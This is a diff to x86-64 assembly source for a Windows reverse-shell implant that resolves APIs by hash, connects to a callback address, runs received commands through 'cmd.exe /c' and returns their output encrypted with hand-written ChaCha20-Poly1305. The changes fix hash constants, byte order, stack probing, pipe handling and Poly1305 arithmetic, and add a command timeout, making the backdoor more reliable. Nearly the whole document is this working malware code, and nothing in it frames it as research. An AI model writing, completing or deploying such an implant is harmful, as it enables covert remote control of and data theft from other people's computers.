@@ -6,10 +6,10 @@
 BITS 64
 
 %ifndef CALLBACK_IP
-    %define CALLBACK_IP 0x7f000001     ; 127.0.0.1
+    %define CALLBACK_IP 0x0100007f     ; 127.0.0.1 (network byte order, LE stored)
 %endif
 %ifndef CALLBACK_PORT
-    %define CALLBACK_PORT 0x01bb       ; 443
+    %define CALLBACK_PORT 0xbb01       ; 443 (network byte order, LE stored)
 %endif
 
 ; ── Windows constants ──
@@ -37,29 +37,33 @@ BITS 64
 %define API_recv                 12
 %define API_send                 13
 %define API_SystemFunction036    14
-%define API_COUNT                15
+%define API_TerminateProcess     15
+%define API_PeekNamedPipe        16
+%define API_COUNT                17
 
 ; ── ror13 hashes (precomputed) ──
 ; kernel32.dll
-%define H_LoadLibraryA        0x726774c
-%define H_GetProcAddress      0x7802f749
-%define H_CreateProcessA      0x863fcc79
-%define H_ReadFile            0xbb5f9ead
-%define H_CreatePipe          0x344b5e8b
-%define H_CloseHandle         0x528796c6
-%define H_ExitProcess         0x56a2b5f0
-%define H_WaitForSingleObject 0x601d8708
+%define H_LoadLibraryA        0xec0e4e8e
+%define H_GetProcAddress      0x7c0dfcaa
+%define H_CreateProcessA      0x16b3fe72
+%define H_ReadFile            0x10fa6516
+%define H_CreatePipe          0x170c8f80
+%define H_CloseHandle         0x0ffd97fb
+%define H_ExitProcess         0x73e2d87e
+%define H_WaitForSingleObject 0xce05d9ad
 %define H_GetLastError        0x75da1966
+%define H_TerminateProcess    0x78b5b983
+%define H_PeekNamedPipe       0xb407c411
 
 ; ws2_32.dll
-%define H_WSAStartup          0x006b8029
-%define H_WSASocketA          0xe0df0fea
-%define H_connect             0x6174a599
-%define H_recv                0xe32bb0e0
+%define H_WSAStartup          0x3bfcedcb
+%define H_WSASocketA          0xadf509d9
+%define H_connect             0x60aaf9ec
+%define H_recv                0xe71819b6
 %define H_send                0xe97019a4
 
 ; advapi32.dll
-%define H_SystemFunction036   0xc1d71f68
+%define H_SystemFunction036   0xa8a1833c
 
 ; ============================================================
 ; _start — entry point
@@ -73,17 +77,17 @@ _start:
     and     rsp, -16
 
     ; Allocate space:
-    ;   API table:        15 * 8 = 120 bytes
+    ;   API table:        17 * 8 = 136 bytes
     ;   WSADATA:          408 bytes
     ;   sockaddr_in:      16 bytes
     ;   work buffers:     allocated later as needed
-    ; Total initial:      ~560 bytes, round up to 1024
+    ; Total initial:      ~568 bytes, round up to 1024
     sub     rsp, 1024
 
-    ; RSP+0    = api_table[0..14]  (120 bytes)
-    ; RSP+120  = WSADATA           (408 bytes)
-    ; RSP+528  = sockaddr_in       (16 bytes)
-    ; RSP+544  = scratch space
+    ; RSP+0    = api_table[0..16]  (136 bytes)
+    ; RSP+136  = WSADATA           (408 bytes)
+    ; RSP+544  = sockaddr_in       (16 bytes)
+    ; RSP+560  = scratch space
 
     lea     r15, [rsp]          ; r15 = base of api_table
 
@@ -137,6 +141,16 @@ _start:
     call    resolve_hash
     mov     [r15 + API_GetLastError * 8], rax
 
+    mov     rcx, r14
+    mov     edx, H_TerminateProcess
+    call    resolve_hash
+    mov     [r15 + API_TerminateProcess * 8], rax
+
+    mov     rcx, r14
+    mov     edx, H_PeekNamedPipe
+    call    resolve_hash
+    mov     [r15 + API_PeekNamedPipe * 8], rax
+
     ; ── Load ws2_32.dll ──
     call    .get_ws2_str
     db      'ws2_32.dll', 0
@@ -183,20 +197,26 @@ _start:
     add     rsp, 32
     mov     r14, rax            ; r14 = advapi32 base
 
-    ; Resolve SystemFunction036 (RtlGenRandom)
-    mov     rcx, r14
-    mov     edx, H_SystemFunction036
-    call    resolve_hash
+    ; Resolve SystemFunction036 (RtlGenRandom) via GetProcAddress
+    ; (forwarded export — resolve_hash can't follow forwarders)
+    mov     rcx, r14                ; advapi32 base
+    call    .get_sf036_str
+    db      'SystemFunction036', 0
+.get_sf036_str:
+    pop     rdx                     ; rdx = "SystemFunction036"
+    sub     rsp, 32
+    call    [r15 + API_GetProcAddress * 8]
+    add     rsp, 32
     mov     [r15 + API_SystemFunction036 * 8], rax
 
     ; ── WSAStartup ──
-    lea     rdx, [r15 + 120]    ; rdx = &WSADATA
+    lea     rdx, [r15 + 136]    ; rdx = &WSADATA
     mov     ecx, 0x0202         ; wVersionRequired = 2.2
     sub     rsp, 32
     call    [r15 + API_WSAStartup * 8]
     add     rsp, 32
     test    eax, eax
-    jnz     .exit_fail
+    jnz     .exit_wsa_fail
 
     ; ── WSASocketA ──
     mov     ecx, AF_INET        ; af
@@ -209,11 +229,11 @@ _start:
     call    [r15 + API_WSASocketA * 8]
     add     rsp, 48
     cmp     rax, -1
-    je      .exit_fail
+    je      .exit_sock_fail
     mov     r13, rax            ; r13 = socket handle
 
     ; ── Build sockaddr_in and connect ──
-    lea     rdx, [r15 + 528]    ; rdx = &sockaddr_in
+    lea     rdx, [r15 + 544]    ; rdx = &sockaddr_in
     mov     word [rdx], AF_INET
     mov     word [rdx+2], CALLBACK_PORT
     mov     dword [rdx+4], CALLBACK_IP
@@ -226,10 +246,25 @@ _start:
     call    [r15 + API_connect * 8]
     add     rsp, 32
     test    eax, eax
-    jnz     .exit_fail
+    jnz     .exit_conn_fail
 
     ; ── Connected! Enter main command loop ──
     jmp     main_loop
+
+.exit_wsa_fail:
+    mov     ecx, 2              ; WSAStartup failed
+    sub     rsp, 32
+    call    [r15 + API_ExitProcess * 8]
+
+.exit_sock_fail:
+    mov     ecx, 3              ; WSASocketA failed
+    sub     rsp, 32
+    call    [r15 + API_ExitProcess * 8]
+
+.exit_conn_fail:
+    mov     ecx, 4              ; connect failed
+    sub     rsp, 32
+    call    [r15 + API_ExitProcess * 8]
 
 .exit_fail:
     mov     ecx, 1
@@ -282,7 +317,7 @@ find_kernel32:
     dec     ecx
     jmp     .hash_mod_name
 .check_mod_hash:
-    cmp     edx, 0x6a4abc5b     ; ror13 hash of "kernel32.dll"
+    cmp     edx, 0x8fecd63f     ; ror13 hash of "kernel32.dll"
     pop     rsi
     pop     rax
     je      .found_kernel32
@@ -389,8 +424,17 @@ main_loop:
     ;   pipe handles:   16 bytes
     ;   SECURITY_ATTRS: 24 bytes
     ;   misc:           padding
-    ; Total: ~148000, round to 150000
-    sub     rsp, 150000
+    ; Total: ~148000, round to 152064 (37 * 4096, 16-aligned)
+    ; Probe stack pages (4KB each) to trigger guard pages
+    mov     ecx, 37             ; 37 pages * 4096 = 151552
+.probe_stack:
+    sub     rsp, 4096
+    mov     byte [rsp], 0       ; touch page to trigger guard
+    dec     ecx
+    jnz     .probe_stack
+    ; RSP is now 151552 bytes lower; subtract remaining for 152064
+    sub     rsp, 512            ; 151552 + 512 = 152064
+
     ; r12 = base of working area
     lea     r12, [rsp + 32]     ; leave shadow space at bottom
 
@@ -453,7 +497,6 @@ main_loop:
     cmp     dword [r12], 'EXIT'
     je      .loop_exit_ok
 .not_exit:
-
     ; ── Execute command ──
     ; Build "cmd.exe /c <command>"
     lea     rdi, [r12 + 139328] ; cmd_str
@@ -495,7 +538,7 @@ main_loop:
     lea     rcx, [r12 + 147712]     ; &hReadPipe
     lea     rdx, [r12 + 147712 + 8] ; &hWritePipe
     lea     r8, [r12 + 147728]      ; &sa
-    xor     r9d, r9d                ; nSize = 0
+    mov     r9d, 65536              ; nSize = 64KB (prevent pipe deadlock)
     sub     rsp, 32
     call    [r15 + API_CreatePipe * 8]
     add     rsp, 32
@@ -517,7 +560,7 @@ main_loop:
     mov     dword [rax], 104            ; cb
     mov     dword [rax+60], STARTF_USESTDHANDLES ; dwFlags
     mov     rcx, [r12 + 147712 + 8]    ; hWritePipe
-    mov     [rax+80], rcx              ; hStdInput = NULL (leave 0)
+    ; hStdInput left as 0 (zeroed by rep stosb above)
     mov     [rax+88], rcx              ; hStdOutput = hWritePipe
     mov     [rax+96], rcx              ; hStdError = hWritePipe
 
@@ -546,41 +589,86 @@ main_loop:
     call    [r15 + API_CloseHandle * 8]
     add     rsp, 32
 
-    ; ── WaitForSingleObject ──
+    ; ── Poll loop: read pipe while waiting for process (30s timeout) ──
+    xor     ebx, ebx                   ; total bytes read
+    mov     edi, 300                   ; 300 * 100ms = 30s timeout
+
+.poll_loop:
+    ; WaitForSingleObject(hProcess, 100ms)
     mov     rcx, [r12 + 147688]        ; hProcess
-    mov     edx, 30000                 ; 30 second timeout
+    mov     edx, 100                   ; 100ms
     sub     rsp, 32
     call    [r15 + API_WaitForSingleObject * 8]
     add     rsp, 32
+    test    eax, eax
+    jz      .process_exited            ; WAIT_OBJECT_0 = process done
 
-    ; ── ReadFile loop ──
-    xor     ebx, ebx                   ; total bytes read
-.read_loop:
-    lea     rcx, [r12 + 8192 + rbx]   ; output_buf + offset
-    mov     edx, 65536
-    sub     edx, ebx                   ; remaining space
-    jle     .read_done                 ; buffer full
-    ; ReadFile(hReadPipe, buf, remaining, &bytesRead, NULL)
-    push    rcx                        ; save buf ptr
+    ; PeekNamedPipe(hReadPipe, NULL, 0, NULL, &bytesAvail, NULL)
     mov     rcx, [r12 + 147712]        ; hReadPipe
-    pop     rdx                        ; lpBuffer
-    push    rdx
+    xor     edx, edx                   ; lpBuffer = NULL
+    xor     r8d, r8d                   ; nBufferSize = 0
+    xor     r9d, r9d                   ; lpBytesRead = NULL
+    sub     rsp, 48
+    lea     rax, [r12 + 147752]
+    mov     [rsp+32], rax              ; &bytesAvail
+    mov     qword [rsp+40], 0          ; lpBytesLeftThisMessage = NULL
+    call    [r15 + API_PeekNamedPipe * 8]
+    add     rsp, 48
+    test    eax, eax
+    jz      .poll_next                 ; PeekNamedPipe failed
+
+    mov     eax, [r12 + 147752]        ; bytesAvail
+    test    eax, eax
+    jz      .poll_next                 ; no data available
+
+    ; Read available data (capped at remaining buffer space)
     mov     r8d, 65536
-    sub     r8d, ebx                   ; nNumberOfBytesToRead
-    lea     r9, [r12 + 147752]         ; &bytesRead
-    sub     rsp, 40                    ; shadow + 1 stack arg
-    mov     qword [rsp+32], 0          ; lpOverlapped = NULL
-    ; Fix args: RCX=handle, RDX=buf, R8=count, R9=&bytesRead
+    sub     r8d, ebx
+    jle     .poll_next                 ; buffer full
+    cmp     eax, r8d
+    cmova   eax, r8d                   ; min(avail, remaining)
+    mov     r8d, eax
+
+    lea     rdx, [r12 + 8192 + rbx]   ; output_buf + offset
     mov     rcx, [r12 + 147712]        ; hReadPipe
-    pop     rdx                        ; lpBuffer
-    sub     rsp, 8                     ; re-align after pop
+    lea     r9, [r12 + 147752]         ; &bytesRead
+    sub     rsp, 48
+    mov     qword [rsp+32], 0          ; lpOverlapped = NULL
     call    [r15 + API_ReadFile * 8]
     add     rsp, 48
     test    eax, eax
-    jz      .read_done                 ; ReadFile failed (ERROR_BROKEN_PIPE)
-
+    jz      .poll_next
     add     ebx, [r12 + 147752]        ; add bytesRead
-    jmp     .read_loop
+
+.poll_next:
+    dec     edi
+    jnz     .poll_loop
+
+    ; Timeout — terminate and send whatever we collected
+    mov     rcx, [r12 + 147688]        ; hProcess
+    mov     edx, 1                     ; exit code
+    sub     rsp, 32
+    call    [r15 + API_TerminateProcess * 8]
+    add     rsp, 32
+    jmp     .read_done
+
+.process_exited:
+    ; Process done — drain any remaining data from pipe
+.drain_loop:
+    mov     r8d, 65536
+    sub     r8d, ebx
+    jle     .read_done                 ; buffer full
+    lea     rdx, [r12 + 8192 + rbx]   ; output_buf + offset
+    mov     rcx, [r12 + 147712]        ; hReadPipe
+    lea     r9, [r12 + 147752]         ; &bytesRead
+    sub     rsp, 48
+    mov     qword [rsp+32], 0          ; lpOverlapped = NULL
+    call    [r15 + API_ReadFile * 8]
+    add     rsp, 48
+    test    eax, eax
+    jz      .read_done                 ; ERROR_BROKEN_PIPE = all data read
+    add     ebx, [r12 + 147752]        ; add bytesRead
+    jmp     .drain_loop
 
 .read_done:
     ; Close remaining handles
@@ -618,12 +706,22 @@ main_loop:
     xor     ebx, ebx            ; 0 bytes output
 
 .send_output:
-    ; Generate 12-byte nonce
-    lea     rcx, [r12 + 73728]  ; nonce at start of crypto_buf
+    ; Generate 12-byte nonce via SystemFunction036 (RtlGenRandom)
+    mov     rax, [r15 + API_SystemFunction036 * 8]
+    test    rax, rax
+    jz      .sf036_null
+    lea     rcx, [r12 + 73728]
     mov     edx, 12
     sub     rsp, 32
-    call    [r15 + API_SystemFunction036 * 8]
+    call    rax
     add     rsp, 32
+    jmp     .sf036_done
+.sf036_null:
+    ; Function not found — use zeroed nonce fallback
+    lea     rax, [r12 + 73728]
+    mov     qword [rax], 0
+    mov     dword [rax+8], 0
+.sf036_done:
 
     ; aead_encrypt(output_buf, output_len, nonce, crypto_buf+12)
     lea     rcx, [r12 + 73728]      ; nonce ptr (12 bytes)
@@ -989,7 +1087,7 @@ quarter_round:
 chacha20_encrypt:
     push    rbp
     mov     rbp, rsp
-    sub     rsp, 96             ; 64 keystream block + shadow
+    sub     rsp, 104            ; 64 keystream block + shadow + 8 alignment pad
     push    rbx
     push    rsi
     push    rdi
@@ -1123,21 +1221,13 @@ poly1305_mac:
     ; Set the hibit (byte after last data byte = 0x01)
     cmp     ecx, 16
     jl      .poly_partial
-    ; Full block: set bit 128
-    mov     byte [rbp-56+16], 1 ; Wait, we need a 17th byte position
-    ; Actually for Poly1305, we add 2^128 to full blocks
-    ; We handle this in the accumulator arithmetic
-    mov     eax, 1              ; hibit = 1 for full blocks
+    ; Full block: hibit = 1 (add 2^128 via accumulator arithmetic)
+    mov     eax, 1
     jmp     .poly_add_block
 .poly_partial:
-    ; Partial block: set byte after data to 0x01
+    ; Partial block: set byte after data to 0x01 (padding)
     mov     byte [rbp-56+rdx], 1
-    mov     eax, 0              ; hibit = 0 for partial (already included)
-    ; For partial blocks, the 1-byte is already in the block itself
-    ; Actually poly1305 adds 1 bit after the message for both
-    ; For full blocks: add 2^128 (hibit=1 in third limb)
-    ; For partial: the 0x01 padding is already in the block data
-    mov     eax, 0
+    xor     eax, eax            ; hibit = 0 for partial
 .poly_add_block:
     ; Add block to accumulator
     ; block = [rbp-56] (lo), [rbp-48] (hi)
@@ -1210,25 +1300,27 @@ poly1305_mac:
     shr     r11, 2
     and     r10, 3              ; keep only bits 128-129 in r10
 
-    ; Multiply overflow by 5
-    mov     rdx, rax
-    lea     rax, [rax + rax*4]  ; rax *= 5
-    ; Also handle r11 * 5 if needed (for very large values)
-    ; In practice r11 after shift should be small
-
-    ; Add back
+    ; Multiply overflow by 5 using mul (lea truncates to 64 bits, losing carry)
+    ; overflow = rax + r11*2^64, need full (overflow * 5) added to r8:r9:r10
+    push    r11                 ; save high_overflow
+    mov     rcx, 5
+    mul     rcx                 ; rdx:rax = low_overflow * 5
     add     r8, rax
-    adc     r9, 0
+    adc     r9, rdx
     adc     r10, 0
 
-    ; Check if we need another reduction
-    ; (r10 could have bits above 2 again, but at most 1 more round)
+    pop     rax                 ; high_overflow
+    mul     rcx                 ; rdx:rax = high_overflow * 5
+    add     r9, rax
+    adc     r10, rdx
+
+    ; Second reduction pass (r10 may have bits above 2 again)
     mov     rax, r10
     shr     rax, 2
     and     r10, 3
-    lea     rax, [rax + rax*4]
+    mul     rcx                 ; rdx:rax = second_overflow * 5 (rcx still 5)
     add     r8, rax
-    adc     r9, 0
+    adc     r9, rdx
     adc     r10, 0
 
     ; Store accumulator
@@ -1245,11 +1337,42 @@ poly1305_mac:
     jg      .poly_block_loop
 
 .poly_finalize:
-    ; a += s
-    mov     rax, [rbp-40]       ; a_lo
-    add     rax, [rbp-16]       ; s_lo
-    mov     rdx, [rbp-32]       ; a_hi
-    adc     rdx, [rbp-8]        ; s_hi
+    ; Final reduction: if a >= p (2^130-5), compute a -= p (i.e., a = a+5-2^130)
+    ; a = a_lo + a_hi*2^64 + a_carry*2^128
+    mov     r8, [rbp-40]        ; a_lo
+    mov     r9, [rbp-32]        ; a_hi
+    mov     r10, [rbp-24]       ; a_carry (0-3)
+
+    ; Compute t = a + 5
+    mov     rax, r8
+    add     rax, 5
+    mov     rdx, r9
+    adc     rdx, 0
+    mov     rcx, r10
+    adc     rcx, 0
+
+    ; If t >= 2^130 (bit 2+ of rcx set, or rcx >= 4), then a >= p
+    shr     rcx, 2              ; rcx = 1 if overflow, 0 if not
+    ; If rcx=1, use t (with bits 130+ cleared); else use original a
+    neg     rcx                 ; 0 -> 0, 1 -> 0xFFFFFFFFFFFFFFFF
+    ; mask = rcx (all 1s if overflow, all 0s if not)
+    ; result = (t & mask) | (a & ~mask)
+    ; Simplified: if mask, use reduced values (rax, rdx); else use r8, r9
+    ; When mask=1: rax already has a+5 low, rdx has a+5 hi
+    ; Need to clear bits 130+ from rdx — but actually after shr/neg we just select
+    mov     rbx, rcx            ; mask
+    ; reduced = a+5 with bits 130+ cleared: rax, rdx (rcx was shifted out)
+    and     rax, rbx            ; t_lo & mask
+    and     rdx, rbx            ; t_hi & mask
+    not     rbx                 ; ~mask
+    and     r8, rbx             ; a_lo & ~mask
+    and     r9, rbx             ; a_hi & ~mask
+    or      rax, r8             ; final a_lo
+    or      rdx, r9             ; final a_hi
+
+    ; tag = (a + s) mod 2^128
+    add     rax, [rbp-16]       ; + s_lo
+    adc     rdx, [rbp-8]        ; + s_hi
 
     ; Store tag (low 128 bits)
     mov     [r14], rax
@@ -1332,50 +1455,36 @@ aead_encrypt:
     call    chacha20_encrypt
     add     rsp, 48
 
-    ; Step 3: Compute Poly1305 MAC per RFC 8439
+    ; Step 3: Compute Poly1305 MAC per RFC 8439 (in-place)
     ; mac_data = pad16(ciphertext) || le64(0) || le64(ct_len)
-    ; Build mac_data on stack
-    ; We need: padded_ct_len + 16 bytes footer
+    ; Build mac_data directly in output buffer (ct already there)
     mov     eax, r14d           ; ct_len
     add     eax, 15
     and     eax, -16            ; padded_ct_len = (ct_len + 15) & ~15
     mov     ebx, eax            ; save padded len
 
-    ; Allocate mac_data buffer (padded_ct + 16 bytes for lengths)
-    ; We'll build it at [rbp-160] area... actually need dynamic
-    ; For simplicity, build in output buffer after ct+mac area
-    ; mac_data_buf = output + pt_len + 16 (after where mac will go)
-    lea     rsi, [r15 + r14 + 16] ; mac_data buffer (temp, after our output area)
-
-    ; Copy ciphertext to mac_data
-    xor     ecx, ecx
-.copy_ct_mac:
-    cmp     ecx, r14d
-    jge     .pad_ct
-    mov     al, [r15 + rcx]
-    mov     [rsi + rcx], al
-    inc     ecx
-    jmp     .copy_ct_mac
+    ; Zero-pad ct to 16-byte boundary (bytes ct_len..padded_len-1)
+    mov     ecx, r14d
 .pad_ct:
-    ; Zero-pad to 16-byte boundary
-.pad_loop:
     cmp     ecx, ebx
     jge     .add_lengths
-    mov     byte [rsi + rcx], 0
+    mov     byte [r15 + rcx], 0
     inc     ecx
-    jmp     .pad_loop
+    jmp     .pad_ct
 .add_lengths:
-    ; Append le64(aad_len=0) || le64(ct_len)
-    mov     qword [rsi + rbx], 0       ; aad_len = 0
+    ; Append le64(aad_len=0) || le64(ct_len) right after padded ct
+    ; This temporarily overwrites the MAC tag area, which is fine
+    ; since we haven't written the MAC yet
+    mov     qword [r15 + rbx], 0       ; aad_len = 0
     mov     eax, r14d
-    mov     [rsi + rbx + 8], rax       ; ct_len as le64
+    mov     [r15 + rbx + 8], rax       ; ct_len as le64
 
     ; Total mac_data length
     lea     r8d, [ebx + 16]            ; padded_ct + 16
 
     ; Compute Poly1305 MAC
     lea     rcx, [rbp - 64]            ; poly1305 one-time key
-    mov     rdx, rsi                   ; mac_data
+    mov     rdx, r15                   ; mac_data = output buf (ct in-place)
     ; r8d already set
     lea     r9, [r15 + r14]            ; tag output = right after ciphertext
     call    poly1305_mac
@@ -1435,42 +1544,42 @@ aead_decrypt:
     lea     r9, [rbp - 64]
     call    chacha20_block
 
-    ; Step 2: Build mac_data and verify MAC
-    ; Same construction as encrypt
+    ; Step 2: Copy ciphertext to output, build mac_data in-place, verify MAC
+    ; Copy ciphertext to output buffer
+    xor     ecx, ecx
+.dec_copy:
+    cmp     ecx, r14d
+    jge     .dec_copy_done
+    mov     al, [r13 + rcx]
+    mov     [r15 + rcx], al
+    inc     ecx
+    jmp     .dec_copy
+.dec_copy_done:
+
+    ; Pad and add lengths in-place for MAC computation
     mov     eax, r14d
     add     eax, 15
     and     eax, -16
     mov     ebx, eax            ; padded_ct_len
 
-    ; Use output buffer as temp for mac_data
-    lea     rsi, [r15 + r14 + 32]
-
-    ; Copy ciphertext to mac_data
-    xor     ecx, ecx
-.dec_copy_ct:
-    cmp     ecx, r14d
-    jge     .dec_pad
-    mov     al, [r13 + rcx]
-    mov     [rsi + rcx], al
-    inc     ecx
-    jmp     .dec_copy_ct
+    ; Zero-pad ct to 16-byte boundary
+    mov     ecx, r14d
 .dec_pad:
-.dec_pad_loop:
     cmp     ecx, ebx
     jge     .dec_add_lengths
-    mov     byte [rsi + rcx], 0
+    mov     byte [r15 + rcx], 0
     inc     ecx
-    jmp     .dec_pad_loop
+    jmp     .dec_pad
 .dec_add_lengths:
-    mov     qword [rsi + rbx], 0
+    mov     qword [r15 + rbx], 0       ; aad_len = 0
     mov     eax, r14d
-    mov     [rsi + rbx + 8], rax
+    mov     [r15 + rbx + 8], rax       ; ct_len as le64
 
     ; Compute expected MAC
     lea     r8d, [ebx + 16]
     lea     rcx, [rbp - 64]     ; poly1305 key
-    mov     rdx, rsi            ; mac_data
-    lea     r9, [rbp - 96]     ; computed tag (16 bytes)
+    mov     rdx, r15             ; mac_data (ct in-place)
+    lea     r9, [rbp - 96]      ; computed tag (16 bytes)
     call    poly1305_mac
 
     ; Constant-time compare computed tag with received tag
@@ -1486,24 +1595,15 @@ aead_decrypt:
     test    ecx, ecx
     jnz     .cmp_tag
     test    al, al
-    jnz     .decrypt_fail
+    jnz     .decrypt_fail_pop   ; MAC mismatch
 
-    ; Step 3: Copy ciphertext to output and decrypt
-    xor     ecx, ecx
-.dec_copy:
-    cmp     ecx, r14d
-    jge     .dec_copy_done
-    mov     al, [r13 + rcx]
-    mov     [r15 + rcx], al
-    inc     ecx
-    jmp     .dec_copy
-.dec_copy_done:
-
-    pop     rbx                 ; psk_key address
-    mov     rcx, rbx
+    ; Step 3: Decrypt output in-place (ct already copied to r15)
+    ; Decrypt output in-place with chacha20 counter=1
+    pop     rbx                 ; psk_key address (remove extra push)
+    mov     rcx, rbx            ; key
     mov     rdx, r12            ; nonce
-    mov     r8, r15             ; data (output, decrypt in-place)
-    mov     r9d, r14d           ; ct length
+    mov     r8, r15             ; data (output buf with ciphertext)
+    mov     r9d, r14d           ; data length
     sub     rsp, 48
     mov     dword [rsp+32], 1   ; counter = 1
     call    chacha20_encrypt
@@ -1520,6 +1620,9 @@ aead_decrypt:
     leave
     ret
 
+
+.decrypt_fail_pop:
+    pop     rbx                 ; remove extra push from call/pop trick
 .decrypt_fail:
     mov     eax, -1
     pop     r15
